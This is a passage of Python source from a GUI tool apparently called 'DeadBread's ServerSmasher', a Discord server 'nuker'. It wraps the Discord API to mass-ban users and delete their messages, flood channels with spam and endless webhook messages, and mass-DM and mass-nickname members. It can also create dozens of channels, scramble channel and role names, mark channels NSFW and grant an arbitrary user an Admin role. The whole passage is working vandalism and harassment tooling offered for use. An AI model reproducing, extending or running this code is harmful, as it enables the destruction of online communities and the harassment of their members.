            if retries == 5:
                break
        else:
            break

def create_role(name, server):
    retries = 0
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    while True:
        src = requests.post(f"https://{endpoint}discord.com/api/v8/guilds/{server}/roles", headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(3)
            if retries == 5:
                break
        else:
            break

def send_dm(user, content, usetts):
    retries = 0
    payload = {'recipient_id': user}
    src = requests.post("https://"+endpoint+"discord.com/api/v8/users/@me/channels", headers=headers, json=payload)
    dm_json = json.loads(src.content)
    payload = {"content" : content, "tts" : usetts}
    while True:
        src = requests.post(f"https://{endpoint}discord.com/api/v8/channels/{dm_json['id']}/messages", headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 10:
                break
        else:
            break

def ban_user(user,server,banreason):
    retries = 0
    while True:
        src = requests.put(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/bans/{str(user)}?delete-message-days=7&reason={banreason}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_channel(server,channelname,channeltype):
    retries = 0
    payload = {'name': channelname, 'type': channeltype}
    while True:
        src = requests.post(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/channels", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def send_message(channel,msgcontent,usetts):
    retries = 0
    payload = {"content": msgcontent, "tts": usetts}
    while True:
        src = requests.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def mover(server,user,channel):
    retries = 0
    payload = {'channel_id': str(channel)}
    while True:
        src = requests.patch(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def change_nickname(server,user,nick):
    payload = {'nick': str(nick)}
    while True:
        src = requests.patch(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(5)
        else:
            break

def delete_emoji(server,emoji):
    retries = 0
    while True:
        src = requests.delete(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/emojis/{str(emoji)}",headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_emoji(server,encoded,name): # This has pretty huge rate limits, be careful using it.
    retries = 0
    payload = {'image': encoded, 'name': name}
    while True:
        src = requests.post(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/emojis",headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def corrupt_channel(channelid,channame):
    retries = 0
    corruptchanname = ''
    for x in channame:
        if random.randint(1,2) == 1:
            corruptchanname += asciigen(size=1)
        else:
            corruptchanname += x
    payload = {'name': corruptchanname}
    while True:
        src = requests.patch(f'https://{endpoint}discord.com/api/v8/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def corrupt_role(serverid,roleid,rolename):
    retries = 0
    corruptrolename = ''
    for x in rolename:
        if random.randint(1,2) == 1:
            corruptrolename += asciigen(size=1)
        else:
            corruptrolename += x
    payload = {'name': corruptrolename}
    while True:
        src = requests.patch(f'https://{endpoint}discord.com/api/v8/guilds/{serverid}/roles/{roleid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def make_nsfw(channelid):
    retries = 0
    payload = {'nsfw': 'true'}
    while True:
        src = requests.patch(f'https://{endpoint}discord.com/api/v8/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def edit_topic(channelid,newtopic):
    retries = 0
    payload = {'topic': newtopic}
    while True:
        src = requests.patch(f'https://{endpoint}discord.com/api/v8/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def webhook_spam(webhook,content):
    if content == 'asc':
        content = asciigen(size=1999)
    payload = {'content': content}
    while True:
        requests.post(webhook, json=payload)

def heartbeat(interval):
    ack = {
            "op": 1,
            "d": None
        }
    while threading.main_thread().is_alive():
        time.sleep(interval/1000)
        try:
            ws.send(json.dumps(ack))
        except Exception:
            break

def change_presence(text, type, status):
    if type == "Playing":
        gamejson = {
            "name": text,
            "type": 0
        }
    elif type == 'Streaming':
        gamejson = {
            "name": text,
            "type": 1,
            "url": "https://www.twitch.tv/SERVERSMASHER"
        }
    elif type == "Listening to":
        gamejson = {
            "name": text,
            "type": 2
        }
    elif type == "Watching":
        gamejson = {
            "name": text,
            "type": 3
        }
    presence = {
            'op': 3,
            'd': {
                "game": gamejson,
                "status": status,
                "since": 0,
                "afk": False
                }
            }
    ws.send(json.dumps(presence))

def get_user(user):
    for x in range(6):
        src = requests.get(f'https://{endpoint}discord.com/api/v8/users/{user}', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    user_json = json.loads(src.content)
    user = namedtuple('User', sorted(user_json.keys()))(**user_json)
    return user

def get_user_info():
    for x in range(6):
        src = requests.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    user_json = json.loads(src.content)
    user = namedtuple('User', sorted(user_json.keys()))(**user_json)
    return user

def get_guild_threaded(guild):
    global cache_guilds
    del cache_guilds
    retries = 0
    while True:
        try:
            cache_guilds = []
            roles = []
            emojis = []
            members = []
            channels = []
            overwrites = []
            for x in range(6):
                src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}', headers=headers)
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break
            guild_response = json.loads(src.content)
            for role in guild_response['roles']:
                roles.append(namedtuple('Role', sorted(role.keys()))(**role))
            for emoji in guild_response['emojis']:
                emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
            params = {
                'limit': 1000,
            }
            for x in range(6):
                src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/members', headers=headers, params=params)
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break
            response = json.loads(src.content)
            for member in response:
                member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
                members.append(namedtuple('Member', sorted(member.keys()))(**member))
            if len(response) == 1000:
                params['after'] = response[-1]['user'].id
                while True:
                    for x in range(6):
                        src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/members', headers=headers, params=params)
                        if src.status_code == 429:
                            time.sleep(src.json()['retry_after'])
                            continue
                        else:
                            break
                    response = json.loads(src.content)
                    for member in response:
                        member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
                        members.append(namedtuple('Member', sorted(member.keys()))(**member))
                    if len(response) != 1000:
                        break
                    else:
                        params['after'] = response[-1]['user'].id
                        continue
            src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/channels', headers=headers)
            channels_json = json.loads(src.content)
            for channel in channels_json:
                for overwrite in channel['permission_overwrites']:
                    overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
                channel['permission_overwrites'] = overwrites
                channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
            guild_response['roles'] = roles
            guild_response['emojis'] = emojis
            guild_response['members'] = members
            guild_response['channels'] = channels
            guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
            cache_guilds.append(guild)
        except Exception:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_cache():
    global cache_guilds
    cache_guilds = list()
    for x in range(6):
        src = requests.get('https://'+endpoint+'discord.com/api/v8/users/@me/guilds', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    response_json = json.loads(src.content)
    with ThreadPoolExecutor(max_workers=thread_count) as exe:
        for guild in response_json:
            exe.submit(get_guild_threaded, guild['id'])
    return cache_guilds

def get_client_guilds():
    guilds = []
    for x in range(6):
        src = requests.get('https://'+endpoint+'discord.com/api/v8/users/@me/guilds', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    response_json = json.loads(src.content)
    for guild in response_json:
        guilds.append(get_guild(guild['id']))
    return guilds

def get_guild(guild):
    roles = []
    emojis = []
    members = []
    channels = []
    overwrites = []
    for x in range(6):
        src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    guild_response = json.loads(src.content)
    for role in guild_response['roles']:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    for emoji in guild_response['emojis']:
        emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
    for x in range(6):
          src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/members?limit=1000', headers=headers)
          if src.status_code == 429:
              time.sleep(src.json()['retry_after'])
              continue
          else:
              break
    response = json.loads(src.content)
    params = {
        'limit': 1000,
    }
    for member in response:
        member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
        members.append(namedtuple('Member', sorted(member.keys()))(**member))
    if len(response) == 1000:
        params['after'] = response[-1]['user'].id
        while True:
            for x in range(6):
                src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/members', headers=headers, params=params)
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break
            response = json.loads(src.content)
            for member in response:
                member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
                members.append(namedtuple('Member', sorted(member.keys()))(**member))
            if len(response) != 1000:
                break
            else:
                params['after'] = response[-1]['user'].id
                continue
    for x in range(6):
        src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/channels', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    guild_response['roles'] = roles
    guild_response['emojis'] = emojis
    guild_response['members'] = members
    guild_response['channels'] = channels
    guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
    return guild

def get_guild_channels(guild):
    channels = []
    overwrites = []
    for x in range(6):
        src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/channels', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    return channels

def get_guild_roles(guild):
    roles = []
    for x in range(6):
        src = requests.get(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/roles', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    role_json = json.loads(src.content)
    for role in role_json:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    return roles

def get_guild_bans(guild):
    retries = 0
    while True:
        try:
            bans = []
            for x in range(6):
                src = requests.get(f"https://{endpoint}discord.com/api/v8/guilds/{guild}/bans", headers=headers)
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break
            bans_json = json.loads(src.content)
            for ban in bans_json:
                ban['user'] = namedtuple('User', sorted(ban['user'].keys()))(**ban['user'])
                bans.append(namedtuple('Ban', sorted(ban.keys()))(**ban))
        except Exception:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
    return bans

def create_invite(channel):
    payload = {"max_age": 0}
    for x in range(6):
        src = requests.post(f'https://{endpoint}discord.com/api/v8/channels/{channel}/invites', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    invite_json = json.loads(src.content)
    invite = namedtuple('Invite', sorted(invite_json.keys()))(**invite_json)
    return invite

def create_guild(name):
    payload = {"name": name}
    for x in range(6):
        src = requests.post(f'https://{endpoint}discord.com/api/v8/guilds', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    return src

def leave_guild(guild):
    for x in range(6):
        src = requests.delete(f'https://{endpoint}discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    return src

def edit_profile(name, avatar):
    if avatar == "New Avatar...":
        payload = {'username': name}
    else:
        with open(avatar, "rb") as handle:
            encoded = bytes_to_base64_data(handle.read())
        payload = {'avatar': encoded, 'username': name}
    for x in range(6):
        src = requests.patch('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    return src

def create_webhook(channel=None, name=gen(size=32)):
    payload = {"name": name}
    src = requests.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/webhooks", headers=headers, json=payload)
    webhookjson = json.loads(src.content)
    pprint(webhookjson)
    webhookjson['url'] = f"https://ptb.discord.com/api/webhooks/{webhookjson['id']}/{webhookjson['token']}"
    return namedtuple('Webhook', sorted(webhookjson.keys()))(**webhookjson)

def construct_avatar_link(id, hash, size):
    link = f"https://cdn.discordapp.com/avatars/{id}/{hash}.png?size={size}"
    return link

def give_admin_role(guild, user):
    payload = {"name": "Admin", "permissions": 8, "color": random.randrange(16777215)}
    for x in range(6):
        src = requests.post(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break
    role_id = json.loads(src.content)['id']
    payload = {"roles": [role_id]}
    for x in range(6):
        src = requests.patch(f'https://{endpoint}discord.com/api/v8/guilds/{guild}/members/{user}', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break

def edit_role(role, guild, perms):
    payload = {"permissions": perms}
    for x in range(6):
        src =  requests.patch(f"https://{endpoint}discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break

def edit_guild_name(guild, name):
    payload = {"name": name}
    for x in range(6):
        src = requests.patch(f'https://{endpoint}discord.com/api/v8/guilds/{guild}', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break

def edit_guild_icon(guild, icon):
    payload = {"icon": icon}
    for x in range(6):
        src = requests.patch(f"https://{endpoint}discord.com/api/v8/guilds/{guild}", headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(src.json()['retry_after'])
            continue
        else:
            break

def update_cache():
    global guild_cache
    guild_cache = get_client_guilds()

def get_mime(data):  # From Discord.py
    if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        return 'image/png'
    elif data[6:10] in (b'JFIF', b'Exif'):
        return 'image/jpeg'
    elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
        return 'image/gif'
    elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
        return 'image/webp'

def bytes_to_base64_data(data):  # From Discord.py
    fmt = 'data:{mime};base64,{data}'
    mime = get_mime(data)
    b64 = b64encode(data).decode('ascii')
    return fmt.format(mime=mime, data=b64)

def crop_center(pil_img, crop_width, crop_height):
    img_width, img_height = pil_img.size
    return pil_img.crop(((img_width - crop_width) // 2,
                         (img_height - crop_height) // 2,
                         (img_width + crop_width) // 2,
                         (img_height + crop_height) // 2))

def mask_circle_transparent(pil_img, blur_radius, offset=0):
    offset = blur_radius * 1.3 + offset
    mask = Image.new("L", pil_img.size, 0)
    draw = ImageDraw.Draw(mask)
    draw.ellipse((offset, offset, pil_img.size[0] - offset, pil_img.size[1] - offset), fill=255)
    mask = mask.filter(ImageFilter.GaussianBlur(blur_radius))
    result = pil_img.copy()
    result.putalpha(mask)
    return result

def crop_max_square(pil_img):
    return crop_center(pil_img, min(pil_img.size), min(pil_img.size))


#  __  __      _         ___ _   _ ___
# |  \/  |__ _(_)_ _    / __| | | |_ _|
# | |\/| / _` | | ' \  | (_ | |_| || |
# |_|  |_\__,_|_|_||_|  \___|\___/|___|
def main_menu():
    global guild_cache
    global user
    global avatar_b64
    del guild_cache
    guild_cache = create_cache()
    guilds = guild_cache
    server_dict = {}
    usercount = 0
    for guild in guilds:
        usercount += len(guild.members)
        server_dict[f"{guild.name} ({len(guild.members)} members)"] = guild.id
    if len(list(server_dict)) == 0:
        server_dict = {"None": "None"}
    user_frame = [
        [sg.Button(image_data=avatar_b64, size=(3,3), pad=((0,0),0), button_color=theme['background_color'], key=f"Change {client_type} Options"), sg.Text(f"{user.username}#{user.discriminator}, ({user.id})", font='Any 11')],
        [sg.Button("Logout"), sg.Button("Refresh")]
    ]
    server_frame = [
        [sg.Combo(sorted(list(server_dict)), size=(25,0.7), key="ServerID"), sg.Button("Select Server", size=(9,0.8)), sg.Button("Leave Server", size=(9,0.8)),]
    ]
    status_frame = [
        [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], default_value=startup_activity_type, readonly=True, key="StatusType"), sg.InputText(startup_activity_name, key="StatusName"),sg.Combo(['online', 'dnd', 'idle', 'invisible'], default_value=startup_status, readonly=True, key="StatusStatus")],
        [sg.Button("Change Status")]
    ]
    options_frame = [
        [sg.Button(f"Change {client_type} Options")],
        [sg.Input("Server Name", key="NewServerName"), sg.Button("Create Server")],
        [sg.Input(f"https://discord.com/api/oauth2/authorize?client_id={user.id}&permissions=8&scope=bot")]
    ]
    layout = [
        [sg.Frame('Logged in to ServerSmasher as:', user_frame, font='Any 12', title_color=theme['text_color'])],
        [sg.Frame("Edit Status", status_frame, font='Any 12', title_color=theme['text_color'])],
        [sg.Frame(f"{client_type} is in {len(guilds)} Servers ({usercount} members total.)", server_frame, font='Any 10', title_color=theme['text_color'])],
        [sg.Frame("Other Options", options_frame, font='Any 10', title_color=theme['text_color'])]
    ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True, icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            ws.close()
            sys.exit()
        elif event == "Select Server":
            if values["ServerID"] == "None":
                pass
            else:
                window.Close()
                sg.PopupNonBlocking("Loading Server, Please Wait", keep_on_top=True, auto_close=True, auto_close_duration=1, icon=rtb_icon)
                server_menu(server_dict[values["ServerID"]])
        elif event == "Logout":
            window.Close()
            ws.close()
            login_serversmasher()
        elif event == "Refresh":
            sg.PopupNonBlocking("Updating Cache...", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            guild_cache = create_cache()
            guilds = guild_cache
            server_dict = {}
            usercount = 0
            for guild in guilds:
                usercount += len(guild.members)
                server_dict[guild.name] = guild.id
            if len(list(server_dict)) == 0:
                server_dict = {"None": "None"}
            user_frame = [
                [sg.Button(image_data=avatar_b64, size=(3,3), pad=((0,0),0), button_color=theme['background_color'], key=f"Change {client_type} Options"), sg.Text(f"{user.username}#{user.discriminator}, ({user.id})", font='Any 11')],
                [sg.Button("Logout"), sg.Button("Refresh")]
            ]
            server_frame = [
                [sg.Combo(sorted(list(server_dict)), size=(20,0.7), key="ServerID"), sg.Button("Select Server", size=(9,0.8)), sg.Button("Leave Server", size=(9,0.8)),]
            ]
            status_frame = [
                [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], default_value=startup_activity_type, readonly=True, key="StatusType"), sg.InputText(startup_activity_name, key="StatusName"),sg.Combo(['online', 'dnd', 'idle', 'invisible'], default_value=startup_status, readonly=True, key="StatusStatus")],
                [sg.Button("Change Status")]
            ]
            options_frame = [
                [sg.Button(f"Change {client_type} Options")],
                [sg.Input("Server Name", key="NewServerName"), sg.Button("Create Server")],
                [sg.Input(f"https://discord.com/api/oauth2/authorize?client_id={user.id}&permissions=8&scope=bot")]
            ]
            layout = [
                [sg.Frame('Logged in to ServerSmasher as:', user_frame, font='Any 12', title_color=theme['text_color'])],
                [sg.Frame("Edit Status", status_frame, font='Any 12', title_color=theme['text_color'])],
                [sg.Frame(f"{client_type} is in {len(guilds)} Servers ({usercount} members total.)", server_frame, font='Any 10', title_color=theme['text_color'])],
                [sg.Frame("Other Options", options_frame, font='Any 10', title_color=theme['text_color'])]
            ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True, icon=rtb_icon).Layout(layout)
            window.Close()
            window = window1
        elif event == "Leave Server":
            e = sg.PopupYesNo(f"Are you sure you want to leave {values['ServerID']}?", keep_on_top=True, icon=rtb_icon)
            if e == "Yes":
                window.Close()
                leave_guild(server_dict[values["ServerID"]])
                main_menu()
            else:
                pass
        elif event == "Change Status":
            change_presence(values["StatusName"], values["StatusType"], values["StatusStatus"])
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['startup_status'] = values["StatusStatus"]
                edit['startup_activity_name'] = values["StatusName"]
                edit['startup_activity_type'] = values["StatusType"]
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
        elif event == "Create Server":
            window.Close()
            create_guild(values["NewServerName"])
            sg.PopupNonBlocking("Updating Cache...", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            main_menu()
        elif event == "Change Bot Options":
            option_frame = [
                [sg.Input("New Avatar...", key="NewAvatarBot", size=(15,0.7)), sg.FileBrowse(file_types=(("PNG Files", "*.png"),("JPG Files", "*.jpg"),("JPEG Files", "*.jpeg"),("GIF Files", "*.gif"),("WEBM Files", "*.webm")))],
                [sg.Input(user.username, key="NewBotName", size=(15,0.7)), sg.Text(f"#{user.discriminator}")]
            ]
            layout = [
                [sg.Frame("Bot Options", option_frame, font='Any 10', title_color=theme['text_color'])],
                [sg.Button("Save Changes"), sg.Button("Back")]
            ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True, icon=rtb_icon).Layout(layout)
            window.Close()
            window = window1
        elif event == "Save Changes":
            sg.PopupNonBlocking("Saving Changes...", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            edit_profile(values["NewBotName"], values["NewAvatarBot"])
        elif event == "Back":
            window.Close()
            sg.PopupNonBlocking("Downloading Data From Discord, Please Wait...", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            main_menu()

def server_menu(server_id):
    global spamming
    server = get_guild(server_id)
    server_owner = get_user(server.owner_id)
    spamming = False
    tchannels = {}
    vchannels = {}
    tlist = []
    vlist = []
    if len(server.channels) == 0:
        tchannels = {"None":"None"}
        vchannels = {"None":"None"}
        tlist = []
        vlist = []
    for channel in server.channels:
        if channel.type == 0:
            tchannels[channel.name] = channel.id
            tlist.append(channel)
        elif channel.type == 2:
            vchannels[channel.name] = channel.id
            vlist.append(channel)
    for member in server.members:
        if member.user.id == user.id:
            server_me = member
    info = [
        [sg.Text(f"Name: {server.name}\nID: {server.id}\nText Channels: {len(tlist)}\nVoice Channels: {len(vlist)}\nRoles: {len(server.roles)}\nMembers: {len(server.members)}\nRegion: {server.region}\nNitro Boost Level: {server.premium_tier}\nVerification Level: {server.verification_level}\nOwner: {server_owner.username}#{server_owner.discriminator}")],
        [sg.Button("View Permissions")]
    ]
    oneclick = [
        [sg.Button("Refresh", size=(13.5,0.8)), sg.Button("Back to server menu", size=(13.5,0.8))],
        [sg.Input("@everyone", size=(17,0.8), key="BlastContent"), sg.Button("Blast", size=(10,0.8))],
        [sg.Input("Channel Name", size=(13.6,0.8), key="ChannelName"),sg.Input("5", size=(3,0.8), key="ChannelCount"), sg.Button("Create Channel", size=(10,0.8))],
        [sg.Text("", size=(0.05,0.8)), sg.Combo(list(tchannels), key="InviteChan", size=(16.6,0.7)), sg.Button("Create Invite", size=(10,0.8))],
        [sg.Input("Dead", size=(17,0.8), key="NewNickname"), sg.Button("Mass Nickname", size=(10,0.8))],
        [sg.Input("ID For Admin", size=(17,0.8), key="AdminID"), sg.Button("Give Admin", size=(10,0.8))]
    ]
    advanced = [
        [sg.Button("Scripted Smash")],
        [sg.Button("Server Corruptor")],
        [sg.Button("Thanos Snap")]
    ]
    mass_dm = [
        [sg.Multiline("DM Content", key="MassDmContent")],
        [sg.Button("Send DM to Everyone")]
    ]
    layout = [
        [sg.Frame("Server Info", info, font='Any 12', title_color=theme['text_color']), sg.Frame("Actions", oneclick, font='Any 12', title_color=theme['text_color'])],
        [sg.Frame("Advanced Actions", advanced, font='Any 12', title_color=theme['text_color']),sg.Frame("Mass DM (ONLY USE ON BOTS!)", mass_dm, font='Any 12', title_color=theme['text_color'])]
    ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True, icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            ws.close()
            sys.exit()
        elif event == "Refresh":
            sg.PopupNonBlocking("Updating cache...", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            window.Close()
            server_menu(server_id)
        elif event == "Back to server menu":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            main_menu()
        elif event == "Blast":
            try:
                channels = get_guild_channels(server_id)
            except Exception as e:
                sg.PopupNonBlocking("Slow the fuck down.", keep_on_top=True, icon=rtb_icon)
            else:
                try:
                    for channel in channels:
                        if not channel.type == 0:
                            pass
                        else:
                            if values["BlastContent"].lower() == "ascii":
                                content = asciigen(size=1999)
                            else:
                                content = values["BlastContent"]
                            executor.submit(send_message, channel.id, content, False)
                except Exception as e:
                    sg.PopupNonBlocking(f"Error: {e}", icon=rtb_icon)
        elif event == "Create Channel":
            for x in range(int(values['ChannelCount'])):
                executor.submit(create_channel, server.id, values['ChannelName'], 0)
        elif event == "Create Invite":
            invite = create_invite(tchannels[values["InviteChan"]])
            try:
                if invite.code == 50013:
                    sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True, icon=rtb_icon)
                else:
                    pyperclip.copy(f"https://discord.gg/{invite.code}")
                    sg.Popup(f"https://discord.gg/{invite.code} copied to clipboard.", title="Invite copied to clipboard", non_blocking=True, keep_on_top=True, icon=rtb_icon)
            except Exception:
                sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True, icon=rtb_icon)
        elif event == "Mass Nickname":
            for member in server.members:
                executor.submit(change_nickname, server.id, member.user.id, values['NewNickname'])
        elif event == "Give Admin":
            give_admin_role(server.id, values["AdminID"])
        elif event == "Send DM to Everyone":
            for member in server.members:
                executor.submit(send_dm, member.user.id, values["MassDmContent"], False)
        elif event == "View Permissions":
            window.Close()
            perm_viewer(server, server_me)
        elif event == "Scripted Smash":
            window.Close()
            scripted_smash(server.id)
        elif event == "Thanos Snap":
            window.Close()
            thanos_snap(server)
        elif event == "Server Corruptor":
            window.Close()
            e = sg.PopupYesNo("Are you sure?", title="Confirm", keep_on_top=True, icon=rtb_icon)
            if e == "Yes":
                corruptor(server)
            else:
                sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
                server_menu(server_id)

def perm_viewer(server, server_me):
    perms = {}
    myroles = ""
    for role in server.roles:
        if role.id in server_me.roles:
            myroles += (f"{role.name}\n")
        roleperms = []
        for permbit in sorted(list(bitarray_values)):
            if role.permissions & bitarray_values[permbit] != 0:
                roleperms.append(permbit)
            perms[role.name] = roleperms
    col1 = [
        [sg.Text(f"My Roles:\n{myroles}")],
        [sg.Combo(list(perms), key="Role", size=(15,0.7))]
    ]
    col2 = [
        [sg.Multiline("Select a role to view permissions", key="PermView", size=(20,6))]
    ]
    frame = [
        [sg.Column(col1), sg.Column(col2)]
    ]
    layout = [
        [sg.Frame("Permissions:", frame, font='Any 12', title_color=theme['text_color'])],
        [sg.Button("Back")]
    ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True, icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            ws.close()
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            text = ""
            for perm in perms[values["Role"]]:
                text += f"{perm}\n"
            window.Element('PermView').Update(text)
        elif event == "Back":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            server_menu(server.id)

def scripted_smash(server_id):
    global spamming
    global smasheroptions
    spamming = False
    sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
    if not os.path.isdir("RTBFiles/ServerSmasher/presets/"):
        os.mkdir("RTBFiles/ServerSmasher/presets/")
    server = get_guild(server_id)
